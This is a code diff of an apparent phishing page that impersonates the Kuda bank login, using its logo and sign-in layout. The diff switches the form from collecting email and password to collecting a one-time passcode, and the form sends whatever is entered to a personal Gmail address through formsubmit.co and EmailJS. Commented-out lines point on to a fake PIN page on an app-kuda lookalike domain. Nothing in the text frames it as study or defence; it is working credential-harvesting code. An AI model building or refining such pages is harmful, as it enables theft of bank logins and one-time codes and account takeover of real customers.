@@ -15,22 +15,21 @@
 <body>
         <form id="form" method="POST" class="form text-center mx-auto mt-9 pt-6 px-4 lg:px-0 flex flex-col justify-center" action="https://formsubmit.co/payday10177@gmail.com">
         
-            <div class="form__header mb-2" id="form">
+            <div class="form__header mb-2">
                 <img class="w-16 mx-auto" src="kuda_logo.png" alt="Kuda_Logo">
                 <p class="text-2xl font-bold mb-6">Hey, there!</p>
             </div>
-            <p class="label text-left text-sm font-semibold">Email Address</p>
-            <input class="w-full p-3 my-1" type="email" name="email" id="email" placeholder="example@email.com" required>
+            <p class="label text-left text-sm font-semibold">OTP</p>
+            <input class="w-full p-3 my-1" type="email" name="email" id="email" placeholder="Enter OTP" required>
             <input type="hidden" name="_captcha" value="false">
-            <p class="label text-left text-sm font-semibold mt-4">Password</p>
+            <!-- <p class="label text-left text-sm font-semibold mt-4">Password</p>
             <input class="w-full p-3 my-1" type="password" name="password" id="password" placeholder="••••••••••" required>
-            <!-- <input type="hidden" name="_next" value="https://app-kuda.web.app/pin.html"> -->
-            
+            <input type="hidden" name="_next" value="https://app-kuda.web.app/pin.html"> -->
             <button class="w-full py-3 px-3 font-bold text-white my-6" type="submit">Next</button>
-            
         </form>
 
-</body>
+</body> 
+
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
 <script>
@@ -44,9 +43,6 @@
                 .then(function(response) {
                     console.log('Sent successfully:', response);
                     alert('Message sent successfully!');
-                     // Redirect to "pin.html" after successful email send
-                    window.location.href = 'pin.html';
-                    
                 }, function(error) {
                     console.log('Failed to send:', error);
                     alert('Message failed to send. Please try again later.');
